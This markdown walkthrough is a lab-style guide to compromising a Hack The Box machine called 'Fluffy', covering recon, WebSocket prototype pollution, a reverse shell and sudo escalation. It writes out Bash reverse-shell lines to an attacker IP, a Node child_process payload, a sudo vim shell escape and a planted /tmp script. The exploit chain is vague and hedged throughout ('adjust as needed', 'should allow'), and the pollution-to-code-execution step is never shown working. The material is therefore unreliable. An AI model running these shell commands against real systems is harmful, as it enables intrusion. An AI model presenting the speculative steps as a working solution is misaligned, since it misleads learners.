This markdown file provides a comprehensive step-by-step guide for exploiting the "Fluffy" machine on Hack The Box (HTB). It covers initial reconnaissance, web enumeration, WebSocket exploitation using prototype pollution, privilege escalation, and obtaining root access. It also includes commands, tools used, and payloads required for the process.

---

## 1. Preparation & Recon

### 1.1 Connect to HTB VPN
```bash
sudo openvpn --config /path/to/htb.ovpn
```

### 1.2 Set the Host
Add the IP and hostname (replace IP as assigned):
```bash
echo "10.10.10.129 fluffy.htb" | sudo tee -a /etc/hosts
```

### 1.3 Nmap Full TCP Scan
```bash
nmap -p- -sC -sV -oN nmap-initial.txt fluffy.htb
```
You’ll typically see:
- 22/tcp (SSH)
- 80/tcp (HTTP)
- 8080/tcp (HTTP, web app)

---

## 2. Web Enumeration

### 2.1 Browse Main Website
Visit:
```
http://fluffy.htb/
```
Find info, then enumerate further.

### 2.2 Directory Discovery
Enumerate paths:
```bash
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://fluffy.htb/FUZZ -mc 200
```

### 2.3 Subdomains (as needed)
Not strictly required per reference walkthrough, focus on found services.

---

## 3. Chat Application & Prototype Pollution (RCE)

### 3.1 Visit Chat App on Port 8080
```
http://fluffy.htb:8080/
```
Notice: WebSocket chat interface—username and messages sent.

### 3.2 WebSocket Connection
Install wscat:
```bash
npm install -g wscat
```
Connect:
```bash
wscat -c ws://fluffy.htb:8080/
```

### 3.3 Perform Prototype Pollution
Send the following as your username via WebSocket (payloads may be sent as JSON):
```json
{
  "username": "__proto__",
  "message": {"polluted": "yes"}
}
```
This exploits Node.js prototype pollution on the backend.

### 3.4 Achieve Code Execution (Reverse Shell)
Start a netcat listener:
```bash
nc -lvnp 4444
```
Craft/Send Payload to Execute Reverse Shell:
WebSocket messages may allow JavaScript. Use a command injection or prototype pollution to run:
```javascript
require('child_process').exec('bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1')
```
Adjust the payload as needed according to how the app handles messages/user input.

The polluting step should allow you to inject JS that runs the reverse shell.

---

## 4. User Shell & Enumeration
On catching the shell (should be user fluffy or node):
```bash
whoami
hostname
id
ls -la
cat ~/user.txt
```

---

## 5. Post-Exploitation & Privilege Escalation

### 5.1 Sudo Rights Enumeration
```bash
sudo -l
```
Find if you can run any scripts as root/no password.

### 5.2 Exploit Sudo Config
If allowed to run an editor (like nano or vim):
```bash
sudo vim -c ':!bash'
```
Or if there are allowed scripts, and they're writable:
```bash
echo 'bash -i >& /dev/tcp/<YOUR_IP>/5555 0>&1' > /tmp/root.sh
chmod +x /tmp/root.sh
```
Then edit the allowed script (if possible) or use existing privileges to execute your payload.

---

## 6. Get the Root Flag
Once you have a root shell:
```bash
cat /root/root.txt
```

---

## Bonus: Code and Tools Used
- **wscat** for WebSocket exploitation:
  ```bash
  npm install -g wscat
  ```
- **Node.js prototype pollution payload** for RCE.
- **Reverse shell (Bash):**
  ```bash
  bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1
  ```
